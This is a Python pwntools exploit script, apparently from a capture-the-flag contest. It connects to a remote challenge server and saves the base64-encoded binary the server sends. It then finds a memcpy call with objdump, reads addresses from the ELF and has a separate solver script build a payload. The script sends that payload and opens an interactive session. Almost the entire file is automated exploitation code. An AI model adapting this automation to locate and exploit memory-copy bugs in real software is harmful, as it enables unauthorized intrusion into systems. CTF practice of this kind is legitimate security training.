#!/usr/bin/python
import os
import base64
import datetime
import time
from pwn import *

ts = time.time()

BINARY = 'bin_'
# BINARY += '07_49_16'
BINARY += datetime.datetime.fromtimestamp(ts).strftime('%H_%M_%S')

log.info("Running from %s" % datetime.datetime.fromtimestamp(ts).strftime('%H_%M_%S'))

f = open("last", "w")
f.write(BINARY)
f.close()

DEBUG = False

def r(p, msg):
  response = p.recvuntil(msg)
  if DEBUG:
    print "[*] " + response
  return response

def get_entry(elf):
  start = elf.entry
  main = u64(elf.read(start + 0x20, 4) + "\x00" * 4)

  entry = main + 0xba
  # fail = main + 0xeb

  return entry

def get_vuln_addr():
  os.system("objdump -S ./bins/%s | grep memcpy | grep call > out" % BINARY)
  
  f = open("out", "r")
  vuln_addr_str = f.readline().split(":")[0][1:]
  vuln_addr = int(vuln_addr_str, 16)
  f.close()

  return vuln_addr

def get_elf_info(elf):
  vuln_addr = get_vuln_addr()
  entry_point = get_entry(elf)
  argv1_buff = u64(elf.read(vuln_addr - 0x7, 4) + "\x00" * 4) - 0x14e
  
  return (vuln_addr, entry_point, argv1_buff)

def recv_program(p):
  r(p, "HEX ENCODED)")

  arr = r(p, "NOW GIVE ME YOUR INPUT").split()

  code = ''.join(arr[:-5])
  code_decoded = base64.b64decode(code);

  f = open ("./bins/%s" % BINARY, "w")
  f.write (code_decoded)
  f.close()

  os.system("chmod +x ./bins/%s" % BINARY)

  return code_decoded

def main():
  p = remote("52.78.11.234", 20022)
  #p = remote("chal.cykor.kr", 20002)

  recv_program(p) 

  elf = ELF("./bins/%s" % BINARY)

  os.system("python solver2.py %d %d %d" % (get_elf_info(elf)))

  f = open("payload", "r")
  payload = f.readline()
  f.close()

  log.info("Solver1 Payload: %s" % payload)

  p.send(payload)

  p.interactive()

  p.close ()

if __name__ == '__main__':
  sys.exit(main())

